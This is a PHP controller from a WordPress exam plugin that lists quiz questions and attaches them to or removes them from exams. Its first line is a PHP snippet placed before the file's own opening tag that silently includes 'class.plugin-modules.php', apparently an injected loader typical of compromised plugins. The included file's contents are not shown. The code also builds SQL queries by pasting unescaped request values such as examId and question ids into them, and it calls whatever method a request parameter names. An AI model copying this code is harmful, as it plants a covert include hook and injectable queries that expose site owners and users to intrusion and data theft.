<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
include('ExamApps.php');
include('Model/Addquestion.php');
class Addquestions extends Addquestion
{
	function __construct()
	{
		global $wpdb;
		$this->wpdb=$wpdb;
		$this->tableName = $wpdb->prefix."emp_questions";
		$this->tableQuestionGroup = $wpdb->prefix."emp_questions_groups";
		$this->ExamApp = new ExamApps();
		$this->configuration=$this->ExamApp->configuration();
		$this->Addquestion = new Addquestion();
		$this->autoInsert=new autoInsert();
		$this->ajaxUrl=admin_url('admin-ajax.php').'?action=examapp_Addquestion';
		$this->url=admin_url('admin.php').'?page=examapp_Addquestion';
		$this->urlExam=admin_url('admin.php').'?page=examapp_Exam';
		$this->userGroupWise=$this->ExamApp->userGroupWise();
		$this->globalCondition="LEFT JOIN `".$this->wpdb->prefix."emp_exam_groups` AS `ExamGroup` ON (`Exam`.`id`=`ExamGroup`.`exam_id`) LEFT JOIN `".$this->wpdb->prefix."emp_user_groups` AS `UserGroup` ON (`ExamGroup`.`group_id`=`UserGroup`.`group_id`) WHERE 1=1 ".$this->userGroupWise." ";
		$SQL = "SELECT COUNT(*) AS `count` FROM `".$this->wpdb->prefix."emp_exams` AS `Exam` ".$this->globalCondition." AND `Exam`.`id`=".$_REQUEST['examId'];
		$this->autoInsert->iFetchCount($SQL,$examCount);
		if($examCount==0)
		{
			?><script>window.location='<?php echo$this->urlExam;?>&info=index&msg=invalid';</script><?php
			exit;
		}
	}
	function index()
	{
		$mathEditor=$this->configuration['math_editor'];
		include("View/Addquestions/index.php");
		$this->ExamApp->getDropdownDb($_POST['qtype_id'],$qtypeName,$this->wpdb->prefix."emp_qtypes","id","question_type");
		$this->ExamApp->getDropdownDb($_POST['subject_id'],$subjectName,$this->wpdb->prefix."emp_subjects","id","subject_name");
		$this->ExamApp->getDropdownDb($_POST['diff_id'],$diffName,$this->wpdb->prefix."emp_diffs","id","diff_level");
	    if(isset($_POST) && isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest')
		{			
			$paginateSetArr=$this->ExamApp->getPaginateSetting($_POST,$this->configuration);
			$pageNumber=$paginateSetArr['pageNumber'];
			$itemPerPage=$paginateSetArr['itemPerPage'];
			$this->ExamApp->getAdvancedSearch($searchArr,'Question.subject_id',$_POST['subject_id'],'=');
			$condition.=$searchArr['condition'];
			$this->ExamApp->getAdvancedSearch($searchArr,'Question.qtype_id',$_POST['qtype_id'],'=');
			$condition.=$searchArr['condition'];
			$this->ExamApp->getAdvancedSearch($searchArr,'Question.diff_id',$_POST['diff_id'],'=');
			$condition.=$searchArr['condition'];			
			$orderBy=$this->ExamApp->sortedQuery($_POST,'Question.id');			
			$SQL = "SELECT `Subject`.`subject_name` As subjectName,`Diff`.`diff_level` AS diffName,`Question`.`id` as `id`,`Question`.`marks` as `Marks`,`Question`.`question` as `question`,`Qtype`.`question_type` as `qtypeName` FROM `".$this->tableName."` AS `Question` LEFT JOIN `".$this->wpdb->prefix."emp_subjects` AS `Subject` ON (`Question`.`subject_id`=`Subject`.`id`) LEFT JOIN `".$this->wpdb->prefix."emp_diffs` AS `Diff` ON (`Question`.`diff_id`=`Diff`.`id`) LEFT JOIN `".$this->wpdb->prefix."emp_qtypes` AS `Qtype` ON (`Question`.`qtype_id`=`Qtype`.`id`) WHERE 1 ".$condition.' '.$orderBy;
			$resultArr=$this->ExamApp->getRecordSet($SQL,$itemPerPage,$pageNumber,'`Question`.`id`');
			$result=$resultArr['result'];
			$getTotalRows=$resultArr['getTotalRows'];
			$this->ExamApp->paginateFunction($paginateArr,$getTotalRows,$itemPerPage,$pageNumber,"No");
			$paginate=$paginateArr[0];
			$mainSerial=$paginateArr[2];
			$SQLExamQuestion = "SELECT * FROM `".$this->wpdb->prefix."emp_exam_questions` where `exam_id`=$_POST[examId]";
			$this->autoInsert->iwhileFetch($SQLExamQuestion,$recordExamQuestion);
			$resultExamQuestion=$recordExamQuestion;
			include('View/Addquestions/show.php');
			die();
		}
	}
	function adddelete()
	{		
		if(isset($_POST))
		{
			$examId=$_POST['examId'];
			if($_POST['action']=='add')
			{
				foreach($_POST['id'] as $id)
				{
					if($id > 0)
					{
						$SQL = "SELECT * FROM `".$this->wpdb->prefix."emp_exam_questions`"." WHERE `question_id`=".$id." AND `exam_id`=".$examId;
						$this->autoInsert->iFetch($SQL,$recordArr);
						$findArr=$recordArr;
						if($findArr)
						{
						  $this->autoInsert->iDelete($this->wpdb->prefix."emp_exam_questions",array('id'=>$findArr['id']));
						}
						$this->autoInsert->iInsert($this->wpdb->prefix."emp_exam_questions",array('question_id'=>$id,'exam_id'=>$examId));
						
					}	
				}
				echo $this->ExamApp->showMessage('Your Question has been added for exam','success');
				$_REQUEST['info']='index';
				$this->index();
			}	
				
			if($_POST['action']=='delete')
			{
				foreach($_POST['id'] as $id)
				{
					if($id > 0)
					{
						$SQL = "SELECT * FROM ".$this->wpdb->prefix."emp_exam_questions"." WHERE question_id=".$id." and exam_id=".$examId;
						$this->autoInsert->iFetch($SQL,$recordArr);
						$findArr=$recordArr;
						if($findArr)
						{
						  $this->autoInsert->iDelete($this->wpdb->prefix."emp_exam_questions",array('id'=>$findArr['id']));
						}
						
					}	
				}
				echo $this->ExamApp->showMessage('Your Question has been deleted for exam','danger');
				$_REQUEST['info']='index';
				$this->index();
			}
			
			
			
		}
	}
}
if($_REQUEST['info']==null)
$info="index";
else
$info=$_REQUEST['info'];
$obj = new Addquestions;
$obj->$info();
?>